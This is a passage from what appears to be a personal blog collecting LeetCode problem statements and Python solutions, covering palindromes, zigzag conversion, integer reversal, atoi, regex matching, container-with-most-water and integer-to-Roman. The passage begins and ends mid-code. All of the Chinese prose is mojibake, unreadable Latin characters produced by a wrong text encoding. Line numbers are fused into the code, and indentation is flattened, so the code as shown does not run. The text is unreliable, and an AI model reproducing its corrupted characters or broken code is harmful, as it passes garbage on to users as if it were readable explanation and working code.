longestPalindrome(self, s: str) -&gt; str: length = len(s) if length == 1: return(s) else: sub_str = &quot;&quot; sub_len = 0 for index1 in range(length): for index2 in range(length-1, index1-1, -1): if s[index2] == s[index1] and s[index1:index2+1] == s[index1:index2+1][::-1]: temp_len = index2 + 1 - index1 if temp_len &gt; sub_len: sub_len = temp_len sub_str = s[index1:index2+1] break return(sub_str) çœ‹åˆ°&quot;ccc&quot;è¿™ä¸ªæµ‹è¯•æ•°æ®äººéƒ½å‚»äº† æ¢ä¸ªè§’åº¦æ€è€ƒï¼Œé€†å‘æœå¯»å­—ç¬¦ä¸²å°±å¥½è§£å†³è¿™äº‹äº† Z å­—å½¢å˜æ¢ å°†ä¸€ä¸ªç»™å®šå­—ç¬¦ä¸²sæ ¹æ®ç»™å®šçš„è¡Œæ•°numRowsï¼Œä»¥ä»ä¸Šå¾€ä¸‹ã€ä»å·¦åˆ°å³è¿›è¡ŒZå­—å½¢æ’åˆ—ã€‚ æ¯”å¦‚è¾“å…¥å­—ç¬¦ä¸²ä¸º&quot;PAYPALISHIRING&quot;è¡Œæ•°ä¸º3æ—¶ï¼Œæ’åˆ—å¦‚ä¸‹ï¼š 123P A H NA P L S I I GY I R ä¹‹åï¼Œä½ çš„è¾“å‡ºéœ€è¦ä»å·¦å¾€å³é€è¡Œè¯»å–ï¼Œäº§ç”Ÿå‡ºä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²ï¼Œæ¯”å¦‚ï¼š&quot;PAHNAPLSIIGYIR&quot;ã€‚ è¯·ä½ å®ç°è¿™ä¸ªå°†å­—ç¬¦ä¸²è¿›è¡ŒæŒ‡å®šè¡Œæ•°å˜æ¢çš„å‡½æ•°ï¼š 1string convert(string s, int numRows); ç¤ºä¾‹ 1ï¼š 12è¾“å…¥ï¼šs &#x3D; &quot;PAYPALISHIRING&quot;, numRows &#x3D; 3è¾“å‡ºï¼š&quot;PAHNAPLSIIGYIR&quot; ç¤ºä¾‹ 2ï¼š 1234567è¾“å…¥ï¼šs &#x3D; &quot;PAYPALISHIRING&quot;, numRows &#x3D; 4è¾“å‡ºï¼š&quot;PINALSIGYAHRPI&quot;è§£é‡Šï¼šP I NA L S I GY A H RP I ç¤ºä¾‹ 3ï¼š 12è¾“å…¥ï¼šs &#x3D; &quot;A&quot;, numRows &#x3D; 1è¾“å‡ºï¼š&quot;A&quot; æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰ é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/zigzag-conversion è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚ 12345678910111213141516171819202122232425class Solution: def convert(self, s: str, numRows: int) -&gt; str: if numRows == 1: return(s) length = len(s) forward = True y = -1 lst = [] for _ in range(numRows): lst.append(&quot;&quot;) for index in range(0, length): if forward == True: y += 1 lst[y] += s[index] if y == numRows-1: forward = False else: y -= 1 lst[y] += s[index] if y == 0: forward = True result = &quot;&quot; for _ in lst: result += _ return(result) ä¸€å¼€å§‹å„ç§ç®—å½¢çŠ¶çš„å‘¨æœŸã€ä½™æ•°ã€é‡å¤æ¬¡æ•° ç„¶åæ‹¿è¿™äº›ç©æ„ç®—çŸ©é˜µå®½åº¦ å†é€ ä¸€ä¸ªäºŒç»´åˆ—è¡¨å½“çŸ©é˜µ çœ‹åˆ°ç”¨æ—¶è¶…è¿‡11%ï¼Œå†…å­˜è¶…è¿‡7%å°±çŸ¥é“è‡ªå·±åœ¨çŠ¯ç—…äº† ç›´æ¥æŠŠè¿™ä¸ªé¢˜æƒ³è±¡æˆä¸€ç»´çš„æ¥å›æ‰«ææ¨¡å‹å°±å¥½å¤šäº† æ•´æ•°åè½¬ ç»™ä½ ä¸€ä¸ª32ä½çš„æœ‰ç¬¦å·æ•´æ•°xï¼Œè¿”å›å°†xä¸­çš„æ•°å­—éƒ¨åˆ†åè½¬åçš„ç»“æœã€‚ å¦‚æœåè½¬åæ•´æ•°è¶…è¿‡32ä½çš„æœ‰ç¬¦å·æ•´æ•°çš„èŒƒå›´[âˆ’231,231âˆ’1][-2^{31}, 2^{31} - 1][âˆ’231,231âˆ’1]ï¼Œå°±è¿”å›0ã€‚ å‡è®¾ç¯å¢ƒä¸å…è®¸å­˜å‚¨64ä½æ•´æ•°ï¼ˆæœ‰ç¬¦å·æˆ–æ— ç¬¦å·ï¼‰ã€‚ ç¤ºä¾‹ 1ï¼š 12è¾“å…¥ï¼šx &#x3D; 123è¾“å‡ºï¼š321 ç¤ºä¾‹ 2ï¼š 12è¾“å…¥ï¼šx &#x3D; -123è¾“å‡ºï¼š-321 ç¤ºä¾‹ 3ï¼š 12è¾“å…¥ï¼šx &#x3D; 120è¾“å‡ºï¼š21 ç¤ºä¾‹ 4ï¼š 12è¾“å…¥ï¼šx &#x3D; 0è¾“å‡ºï¼š0 æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰ é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/reverse-integer è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚ 12345678910111213141516171819202122class Solution: def reverse(self, x: int) -&gt; int: temp = [] negative = False if x &lt; 0: negative = True x = - x while x != 0: temp.append(x % 10) x //= 10 cnt = 0 num = 0 for _ in range(-1, -len(temp)-1, -1): num += temp[_] * pow(10, cnt) cnt += 1 if negative == True and num &lt;= pow(2,31): num = -num return(num) elif negative == False and num &lt;= pow(2,31) - 1: return(num) else: return(0) æŒ¨ä¸ªæ¨¡10å–ä½™æ•°ä¸¢åˆ—è¡¨ ç„¶ååå‘è¯»åˆ—è¡¨å°±è¡Œ é€Ÿåº¦ä¸é”™ï¼Œä½†æ˜¯å†…å­˜å¤ªé«˜äº† å­—ç¬¦ä¸²è½¬æ¢æ•´æ•° (atoi) è¯·ä½ æ¥å®ç°ä¸€ä¸ªmyAtoi(string s)å‡½æ•°ï¼Œä½¿å…¶èƒ½å°†å­—ç¬¦ä¸²è½¬æ¢æˆä¸€ä¸ª 32 ä½æœ‰ç¬¦å·æ•´æ•°ï¼ˆç±»ä¼¼ C/C++ ä¸­çš„atoiå‡½æ•°ï¼‰ã€‚ å‡½æ•°myAtoi(string s)çš„ç®—æ³•å¦‚ä¸‹ï¼š è¯»å…¥å­—ç¬¦ä¸²å¹¶ä¸¢å¼ƒæ— ç”¨çš„å‰å¯¼ç©ºæ ¼ æ£€æŸ¥ä¸‹ä¸€ä¸ªå­—ç¬¦ï¼ˆå‡è®¾è¿˜æœªåˆ°å­—ç¬¦æœ«å°¾ï¼‰ä¸ºæ­£è¿˜æ˜¯è´Ÿå·ï¼Œè¯»å–è¯¥å­—ç¬¦ï¼ˆå¦‚æœæœ‰ï¼‰ã€‚ ç¡®å®šæœ€ç»ˆç»“æœæ˜¯è´Ÿæ•°è¿˜æ˜¯æ­£æ•°ã€‚ å¦‚æœä¸¤è€…éƒ½ä¸å­˜åœ¨ï¼Œåˆ™å‡å®šç»“æœä¸ºæ­£ã€‚ è¯»å…¥ä¸‹ä¸€ä¸ªå­—ç¬¦ï¼Œç›´åˆ°åˆ°è¾¾ä¸‹ä¸€ä¸ªéæ•°å­—å­—ç¬¦æˆ–åˆ°è¾¾è¾“å…¥çš„ç»“å°¾ã€‚å­—ç¬¦ä¸²çš„å…¶ä½™éƒ¨åˆ†å°†è¢«å¿½ç•¥ã€‚ å°†å‰é¢æ­¥éª¤è¯»å…¥çš„è¿™äº›æ•°å­—è½¬æ¢ä¸ºæ•´æ•°ï¼ˆå³ï¼Œâ€œ123â€ -&gt; 123ï¼Œ â€œ0032â€ -&gt; 32ï¼‰ã€‚å¦‚æœæ²¡æœ‰è¯»å…¥æ•°å­—ï¼Œåˆ™æ•´æ•°ä¸º 0 ã€‚å¿…è¦æ—¶æ›´æ”¹ç¬¦å·ï¼ˆä»æ­¥éª¤ 2 å¼€å§‹ï¼‰ã€‚ å¦‚æœæ•´æ•°æ•°è¶…è¿‡32ä½æœ‰ç¬¦å·æ•´æ•°èŒƒå›´[âˆ’231,231âˆ’1][-2^{31}, 2^{31} - 1][âˆ’231,231âˆ’1]ï¼Œéœ€è¦æˆªæ–­è¿™ä¸ªæ•´æ•°ï¼Œä½¿å…¶ä¿æŒåœ¨è¿™ä¸ªèŒƒå›´å†…ã€‚å…·ä½“æ¥è¯´ï¼Œå°äºâˆ’231-2^{31}âˆ’231çš„æ•´æ•°åº”è¯¥è¢«å›ºå®šä¸ºâˆ’231-2^{31}âˆ’231ï¼Œå¤§äº231âˆ’12^{31}-1231âˆ’1çš„æ•´æ•°åº”è¯¥è¢«å›ºå®šä¸º231âˆ’12^{31}-1231âˆ’1ã€‚ è¿”å›æ•´æ•°ä½œä¸ºæœ€ç»ˆç»“æœã€‚ æ³¨æ„ï¼š æœ¬é¢˜ä¸­çš„ç©ºç™½å­—ç¬¦åªåŒ…æ‹¬ç©ºæ ¼å­—ç¬¦â€™ 'ã€‚ é™¤å‰å¯¼ç©ºæ ¼æˆ–æ•°å­—åçš„å…¶ä½™å­—ç¬¦ä¸²å¤–ï¼Œè¯·å‹¿å¿½ç•¥ä»»ä½•å…¶ä»–å­—ç¬¦ã€‚ ç¤ºä¾‹1ï¼š 12345678910è¾“å…¥ï¼šs &#x3D; &quot;42&quot;è¾“å‡ºï¼š42è§£é‡Šï¼šåŠ ç²—çš„å­—ç¬¦ä¸²ä¸ºå·²ç»è¯»å…¥çš„å­—ç¬¦ï¼Œæ’å…¥ç¬¦å·æ˜¯å½“å‰è¯»å–çš„å­—ç¬¦ã€‚ç¬¬ 1 æ­¥ï¼š&quot;42&quot;ï¼ˆå½“å‰æ²¡æœ‰è¯»å…¥å­—ç¬¦ï¼Œå› ä¸ºæ²¡æœ‰å‰å¯¼ç©ºæ ¼ï¼‰ ^ç¬¬ 2 æ­¥ï¼š&quot;42&quot;ï¼ˆå½“å‰æ²¡æœ‰è¯»å…¥å­—ç¬¦ï¼Œå› ä¸ºè¿™é‡Œä¸å­˜åœ¨ &#39;-&#39; æˆ–è€… &#39;+&#39;ï¼‰ ^ç¬¬ 3 æ­¥ï¼š&quot;42&quot;ï¼ˆè¯»å…¥ &quot;42&quot;ï¼‰ ^è§£æå¾—åˆ°æ•´æ•° 42 ã€‚ ç”±äº â€œ42â€ åœ¨èŒƒå›´[âˆ’231,231âˆ’1][-2^{31}, 2^{31} - 1][âˆ’231,231âˆ’1]å†…ï¼Œæœ€ç»ˆç»“æœä¸º 42 ã€‚ ç¤ºä¾‹2ï¼š 12345678910è¾“å…¥ï¼šs &#x3D; &quot; -42&quot;è¾“å‡ºï¼š-42è§£é‡Šï¼šç¬¬ 1 æ­¥ï¼š&quot; -42&quot;ï¼ˆè¯»å…¥å‰å¯¼ç©ºæ ¼ï¼Œä½†å¿½è§†æ‰ï¼‰ ^ç¬¬ 2 æ­¥ï¼š&quot; -42&quot;ï¼ˆè¯»å…¥ &#39;-&#39; å­—ç¬¦ï¼Œæ‰€ä»¥ç»“æœåº”è¯¥æ˜¯è´Ÿæ•°ï¼‰ ^ç¬¬ 3 æ­¥ï¼š&quot; -42&quot;ï¼ˆè¯»å…¥ &quot;42&quot;ï¼‰ ^è§£æå¾—åˆ°æ•´æ•° -42 ã€‚ ç”±äº â€œ-42â€ åœ¨èŒƒå›´[âˆ’231,231âˆ’1][-2^{31}, 2^{31} - 1][âˆ’231,231âˆ’1]å†…ï¼Œæœ€ç»ˆç»“æœä¸º -42 ã€‚ ç¤ºä¾‹3ï¼š 12345678910è¾“å…¥ï¼šs &#x3D; &quot;4193 with words&quot;è¾“å‡ºï¼š4193è§£é‡Šï¼šç¬¬ 1 æ­¥ï¼š&quot;4193 with words&quot;ï¼ˆå½“å‰æ²¡æœ‰è¯»å…¥å­—ç¬¦ï¼Œå› ä¸ºæ²¡æœ‰å‰å¯¼ç©ºæ ¼ï¼‰ ^ç¬¬ 2 æ­¥ï¼š&quot;4193 with words&quot;ï¼ˆå½“å‰æ²¡æœ‰è¯»å…¥å­—ç¬¦ï¼Œå› ä¸ºè¿™é‡Œä¸å­˜åœ¨ &#39;-&#39; æˆ–è€… &#39;+&#39;ï¼‰ ^ç¬¬ 3 æ­¥ï¼š&quot;4193 with words&quot;ï¼ˆè¯»å…¥ &quot;4193&quot;ï¼›ç”±äºä¸‹ä¸€ä¸ªå­—ç¬¦ä¸æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œæ‰€ä»¥è¯»å…¥åœæ­¢ï¼‰ ^è§£æå¾—åˆ°æ•´æ•° 4193 ã€‚ ç”±äº â€œ4193â€ åœ¨èŒƒå›´[âˆ’231,231âˆ’1][-2^{31}, 2^{31} - 1][âˆ’231,231âˆ’1]å†…ï¼Œæœ€ç»ˆç»“æœä¸º 4193 ã€‚ ç¤ºä¾‹4ï¼š 12345678910è¾“å…¥ï¼šs &#x3D; &quot;words and 987&quot;è¾“å‡ºï¼š0è§£é‡Šï¼šç¬¬ 1 æ­¥ï¼š&quot;words and 987&quot;ï¼ˆå½“å‰æ²¡æœ‰è¯»å…¥å­—ç¬¦ï¼Œå› ä¸ºæ²¡æœ‰å‰å¯¼ç©ºæ ¼ï¼‰ ^ç¬¬ 2 æ­¥ï¼š&quot;words and 987&quot;ï¼ˆå½“å‰æ²¡æœ‰è¯»å…¥å­—ç¬¦ï¼Œå› ä¸ºè¿™é‡Œä¸å­˜åœ¨ &#39;-&#39; æˆ–è€… &#39;+&#39;ï¼‰ ^ç¬¬ 3 æ­¥ï¼š&quot;words and 987&quot;ï¼ˆç”±äºå½“å‰å­—ç¬¦ &#39;w&#39; ä¸æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œæ‰€ä»¥è¯»å…¥åœæ­¢ï¼‰ ^è§£æå¾—åˆ°æ•´æ•° 0 ï¼Œå› ä¸ºæ²¡æœ‰è¯»å…¥ä»»ä½•æ•°å­—ã€‚ ç”±äº 0 åœ¨èŒƒå›´[âˆ’231,231âˆ’1][-2^{31}, 2^{31} - 1][âˆ’231,231âˆ’1]å†…ï¼Œæœ€ç»ˆç»“æœä¸º 0 ã€‚ ç¤ºä¾‹5ï¼š 12345678910è¾“å…¥ï¼šs &#x3D; &quot;-91283472332&quot;è¾“å‡ºï¼š-2147483648è§£é‡Šï¼šç¬¬ 1 æ­¥ï¼š&quot;-91283472332&quot;ï¼ˆå½“å‰æ²¡æœ‰è¯»å…¥å­—ç¬¦ï¼Œå› ä¸ºæ²¡æœ‰å‰å¯¼ç©ºæ ¼ï¼‰ ^ç¬¬ 2 æ­¥ï¼š&quot;-91283472332&quot;ï¼ˆè¯»å…¥ &#39;-&#39; å­—ç¬¦ï¼Œæ‰€ä»¥ç»“æœåº”è¯¥æ˜¯è´Ÿæ•°ï¼‰ ^ç¬¬ 3 æ­¥ï¼š&quot;-91283472332&quot;ï¼ˆè¯»å…¥ &quot;91283472332&quot;ï¼‰ ^è§£æå¾—åˆ°æ•´æ•° -91283472332 ã€‚ ç”±äº -91283472332 å°äºèŒƒå›´[âˆ’231,231âˆ’1][-2^{31}, 2^{31} - 1][âˆ’231,231âˆ’1]çš„ä¸‹ç•Œï¼Œæœ€ç»ˆç»“æœè¢«æˆªæ–­ä¸ºâˆ’231-2^{31}âˆ’231 = -2147483648 ã€‚ æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰ é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/string-to-integer-atoi è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚ 1234567891011121314151617181920212223242526272829303132class Solution:def myAtoi(self, s: str) -&gt; int: s = s.strip() length = len(s) flag = True if length == 0 or s[0] not in &quot;+-0123456789&quot;: return(0) if s[0] == &quot;+&quot;: s = s[1:] elif s[0] == &quot;-&quot;: flag = False s = s[1:] num_list = [] for _ in s: if _ in &quot;0123456789&quot;: num_list.append(_) else: break num_sum = 0 index = 0 for _ in range(-1, -len(num_list)-1, -1): num_sum += int(num_list[_]) * pow(10, index) index += 1 if flag == True: if num_sum &lt;= pow(2, 31) - 1: return(num_sum) else: return(pow(2, 31) - 1) elif num_sum &lt;= pow(2, 31): return(-num_sum) else: return(-pow(2, 31)) å’Œæ•´æ•°åè½¬é‚£é¢˜æ€è·¯å·®ä¸å¤š æ— éå¤šåšå‡ ä¸ªæ£€æµ‹ç½¢äº† å›æ–‡æ•° ç»™ä½ ä¸€ä¸ªæ•´æ•°xï¼Œå¦‚æœxæ˜¯ä¸€ä¸ªå›æ–‡æ•´æ•°ï¼Œè¿”å›trueï¼›å¦åˆ™ï¼Œè¿”å›falseã€‚ å›æ–‡æ•°æ˜¯æŒ‡æ­£åºï¼ˆä»å·¦å‘å³ï¼‰å’Œå€’åºï¼ˆä»å³å‘å·¦ï¼‰è¯»éƒ½æ˜¯ä¸€æ ·çš„æ•´æ•°ã€‚ä¾‹å¦‚ï¼Œ121æ˜¯å›æ–‡ï¼Œè€Œ123ä¸æ˜¯ã€‚ ç¤ºä¾‹ 1ï¼š 12è¾“å…¥ï¼šx &#x3D; 121è¾“å‡ºï¼štrue ç¤ºä¾‹2ï¼š 123è¾“å…¥ï¼šx &#x3D; -121è¾“å‡ºï¼šfalseè§£é‡Šï¼šä»å·¦å‘å³è¯», ä¸º -121 ã€‚ ä»å³å‘å·¦è¯», ä¸º 121- ã€‚å› æ­¤å®ƒä¸æ˜¯ä¸€ä¸ªå›æ–‡æ•°ã€‚ ç¤ºä¾‹ 3ï¼š 123è¾“å…¥ï¼šx &#x3D; 10è¾“å‡ºï¼šfalseè§£é‡Šï¼šä»å³å‘å·¦è¯», ä¸º 01 ã€‚å› æ­¤å®ƒä¸æ˜¯ä¸€ä¸ªå›æ–‡æ•°ã€‚ ç¤ºä¾‹ 4ï¼š 12è¾“å…¥ï¼šx &#x3D; -101è¾“å‡ºï¼šfalse æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰ é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/palindrome-number è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚ 123456789class Solution: def isPalindrome(self, x: int) -&gt; bool: if x &lt; 0: return(False) string = str(x) if string == string[::-1]: return(True) else: return(False) å½“å­—ç¬¦ä¸²æ¥å¤„ç†æŒºæ–¹ä¾¿çš„ å°±æ˜¯æœ‰ç‚¹å å†…å­˜ æ­£åˆ™è¡¨è¾¾å¼åŒ¹é… ç»™ä½ ä¸€ä¸ªå­—ç¬¦ä¸²så’Œä¸€ä¸ªå­—ç¬¦è§„å¾‹pï¼Œè¯·ä½ æ¥å®ç°ä¸€ä¸ªæ”¯æŒ'.'å’Œ'\\*'çš„æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ã€‚ â€˜.â€™ åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦ â€˜*â€™ åŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ªå‰é¢çš„é‚£ä¸€ä¸ªå…ƒç´  æ‰€è°“åŒ¹é…ï¼Œæ˜¯è¦æ¶µç›–æ•´ä¸ªå­—ç¬¦ä¸²sçš„ï¼Œè€Œä¸æ˜¯éƒ¨åˆ†å­—ç¬¦ä¸²ã€‚ ç¤ºä¾‹ 1ï¼š 123è¾“å…¥ï¼šs &#x3D; &quot;aa&quot; p &#x3D; &quot;a&quot;è¾“å‡ºï¼šfalseè§£é‡Šï¼š&quot;a&quot; æ— æ³•åŒ¹é… &quot;aa&quot; æ•´ä¸ªå­—ç¬¦ä¸²ã€‚ ç¤ºä¾‹ 2: 123è¾“å…¥ï¼šs &#x3D; &quot;aa&quot; p &#x3D; &quot;a*&quot;è¾“å‡ºï¼štrueè§£é‡Šï¼šå› ä¸º &#39;*&#39; ä»£è¡¨å¯ä»¥åŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ªå‰é¢çš„é‚£ä¸€ä¸ªå…ƒç´ , åœ¨è¿™é‡Œå‰é¢çš„å…ƒç´ å°±æ˜¯ &#39;a&#39;ã€‚å› æ­¤ï¼Œå­—ç¬¦ä¸² &quot;aa&quot; å¯è¢«è§†ä¸º &#39;a&#39; é‡å¤äº†ä¸€æ¬¡ã€‚ ç¤ºä¾‹3ï¼š 123è¾“å…¥ï¼šs &#x3D; &quot;ab&quot; p &#x3D; &quot;.*&quot;è¾“å‡ºï¼štrueè§£é‡Šï¼š&quot;.*&quot; è¡¨ç¤ºå¯åŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ªï¼ˆ&#39;*&#39;ï¼‰ä»»æ„å­—ç¬¦ï¼ˆ&#39;.&#39;ï¼‰ã€‚ ç¤ºä¾‹ 4ï¼š 123è¾“å…¥ï¼šs &#x3D; &quot;aab&quot; p &#x3D; &quot;c*a*b&quot;è¾“å‡ºï¼štrueè§£é‡Šï¼šå› ä¸º &#39;*&#39; è¡¨ç¤ºé›¶ä¸ªæˆ–å¤šä¸ªï¼Œè¿™é‡Œ &#39;c&#39; ä¸º 0 ä¸ª, &#39;a&#39; è¢«é‡å¤ä¸€æ¬¡ã€‚å› æ­¤å¯ä»¥åŒ¹é…å­—ç¬¦ä¸² &quot;aab&quot;ã€‚ ç¤ºä¾‹ 5ï¼š 12è¾“å…¥ï¼šs &#x3D; &quot;mississippi&quot; p &#x3D; &quot;mis*is*p*.&quot;è¾“å‡ºï¼šfalse æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰ é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/regular-expression-matching è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚ 123456789class Solution: def isMatch(self, s: str, p: str) -&gt; bool: import re length = len(s) result = re.match(p, s) if result != None and result.span()[1] == length: return(True) else: return(False) å±å®ä¸ä¼šå»å†™æ­£åˆ™çš„åŒ¹é…è§„åˆ™ ç›´æ¥re.matchæ¢­å“ˆäº† ç››æœ€å¤šæ°´çš„å®¹å™¨ ç»™ä½ nä¸ªéè´Ÿæ•´æ•°a1,a2,...,anaa_1, a_2, ..., a_naa1â€‹,a2â€‹,...,anâ€‹a ï¼Œæ¯ä¸ªæ•°ä»£è¡¨åæ ‡ä¸­çš„ä¸€ä¸ªç‚¹(i,ai)ã€‚åœ¨åæ ‡å†…ç”»næ¡å‚ç›´çº¿ï¼Œå‚ç›´çº¿içš„ä¸¤ä¸ªç«¯ç‚¹åˆ†åˆ«ä¸º(i,ai)å’Œ(i, 0)ã€‚æ‰¾å‡ºå…¶ä¸­çš„ä¸¤æ¡çº¿ï¼Œä½¿å¾—å®ƒä»¬ä¸xè½´å…±åŒæ„æˆçš„å®¹å™¨å¯ä»¥å®¹çº³æœ€å¤šçš„æ°´ã€‚ è¯´æ˜ï¼šä½ ä¸èƒ½å€¾æ–œå®¹å™¨ã€‚ ç¤ºä¾‹ 1ï¼š 123è¾“å…¥ï¼š[1,8,6,2,5,4,8,3,7]è¾“å‡ºï¼š49 è§£é‡Šï¼šå›¾ä¸­å‚ç›´çº¿ä»£è¡¨è¾“å…¥æ•°ç»„ [1,8,6,2,5,4,8,3,7]ã€‚åœ¨æ­¤æƒ…å†µä¸‹ï¼Œå®¹å™¨èƒ½å¤Ÿå®¹çº³æ°´ï¼ˆè¡¨ç¤ºä¸ºè“è‰²éƒ¨åˆ†ï¼‰çš„æœ€å¤§å€¼ä¸º49ã€‚ ç¤ºä¾‹ 2ï¼š 12è¾“å…¥ï¼šheight &#x3D; [1,1]è¾“å‡ºï¼š1 ç¤ºä¾‹ 3ï¼š 12è¾“å…¥ï¼šheight &#x3D; [4,3,2,1,4]è¾“å‡ºï¼š16 ç¤ºä¾‹ 4ï¼š 12è¾“å…¥ï¼šheight &#x3D; [1,2,1]è¾“å‡ºï¼š2 æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰ é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/container-with-most-water è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚ 123456789101112131415161718class Solution: def maxArea(self, height) -&gt; int: length = len(height) area = 0 h = 0 index1 = 0 index2 = length - 1 for _ in range(length): if height[index1] &gt;= height[index2]: h = height[index2] index2 -= 1 else: h = height[index1] index1 += 1 temp = h * (index2 + 1 - index1) if temp &gt; area: area = temp return(area) è‡ªå·±é€»è¾‘éƒ½è¿˜æ²¡ç†æ¸…æ¥šï¼Œä»£ç å°±èƒ½è·‘äº† ä¸€å¼€å§‹æƒ³äºŒç»´æŸ¥æ‰¾æ¢­å“ˆï¼Œç„¶åæ­»åœ¨ä¸€ä¸ªé•¿åº¦5000çš„åˆ—è¡¨ä¸Šäº† æ—§ç—‡å¤å‘äº†å±äºæ˜¯ ç„¶åå¼€å§‹ç”¨ä¸€ç»´çš„è§’åº¦å»æ€è€ƒ ABåˆ†åˆ«ä¸ºåˆå§‹å€¼åœ¨åˆ—è¡¨ä¸¤ç«¯çš„ä¸‹æ ‡ï¼Œä¸¤è¾¹å¾€ä¸­é—´å›ç¼©ï¼ˆä¸­é—´å¾€ä¸¤è¾¹è·‘ä¹Ÿè¡Œï¼‰ Aå¤§å°±æŒªBï¼Œåä¹‹äº¦ç„¶ æ•´æ•°è½¬ç½—é©¬æ•°å­— ç½—é©¬æ•°å­—åŒ…å«ä»¥ä¸‹ä¸ƒç§å­—ç¬¦:Iï¼ŒVï¼ŒXï¼ŒLï¼ŒCï¼ŒDå’ŒMã€‚ 12345678å­—ç¬¦ æ•°å€¼I 1V 5X 10L 50C 100D 500M 1000 ä¾‹å¦‚ï¼Œç½—é©¬æ•°å­—2å†™åšIIï¼Œå³ä¸ºä¸¤ä¸ªå¹¶åˆ—çš„1ã€‚12å†™åšXIIï¼Œå³ä¸ºX+IIã€‚ 27å†™åšXXVII, å³ä¸ºXX+V+IIã€‚ é€šå¸¸æƒ…å†µä¸‹ï¼Œç½—é©¬æ•°å­—ä¸­å°çš„æ•°å­—åœ¨å¤§çš„æ•°å­—çš„å³è¾¹ã€‚ä½†ä¹Ÿå­˜åœ¨ç‰¹ä¾‹ï¼Œä¾‹å¦‚4ä¸å†™åšIIIIï¼Œè€Œæ˜¯IVã€‚æ•°å­—1åœ¨æ•°å­—5çš„å·¦è¾¹ï¼Œæ‰€è¡¨ç¤ºçš„æ•°ç­‰äºå¤§æ•°5å‡å°æ•°1å¾—åˆ°çš„æ•°å€¼4 ã€‚åŒæ ·åœ°ï¼Œæ•°å­—9è¡¨ç¤ºä¸ºIXã€‚è¿™ä¸ªç‰¹æ®Šçš„è§„åˆ™åªé€‚ç”¨äºä»¥ä¸‹å…­ç§æƒ…å†µï¼š Iå¯ä»¥æ”¾åœ¨V(5) å’ŒX(10) çš„å·¦è¾¹ï¼Œæ¥è¡¨ç¤º 4 å’Œ 9ã€‚ Xå¯ä»¥æ”¾åœ¨L(50) å’ŒC(100) çš„å·¦è¾¹ï¼Œæ¥è¡¨ç¤º 40 å’Œ90ã€‚ Cå¯ä»¥æ”¾åœ¨D(500) å’ŒM(1000) çš„å·¦è¾¹ï¼Œæ¥è¡¨ç¤º400 å’Œ900ã€‚ ç»™ä½ ä¸€ä¸ªæ•´æ•°ï¼Œå°†å…¶è½¬ä¸ºç½—é©¬æ•°å­—ã€‚ ç¤ºä¾‹1: 12è¾“å…¥:num &#x3D; 3è¾“å‡º: &quot;III&quot; ç¤ºä¾‹2: 12è¾“å…¥:num &#x3D; 4è¾“å‡º: &quot;IV&quot; ç¤ºä¾‹3: 12è¾“å…¥:num &#x3D; 9è¾“å‡º: &quot;IX&quot; ç¤ºä¾‹4: 123è¾“å…¥:num &#x3D; 58è¾“å‡º: &quot;LVIII&quot;è§£é‡Š: L &#x3D; 50, V &#x3D; 5, III &#x3D; 3. ç¤ºä¾‹5: 123è¾“å…¥:num &#x3D; 1994è¾“å‡º: &quot;MCMXCIV&quot;è§£é‡Š: M &#x3D; 1000, CM &#x3D; 900, XC &#x3D; 90, IV &#x3D; 4. æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰ é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/integer-to-roman è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253class Solution: def intToRoman(self, num: int) -&gt; str: num_list = [] while num != 0: num_list.append(num % 10) num //= 10 result = &quot;&quot; for _ in range(len(num_list)): if _ == 0: if num_list[_] == 0: continue elif num_list[_] &lt;= 3: result = &quot;I&quot; * 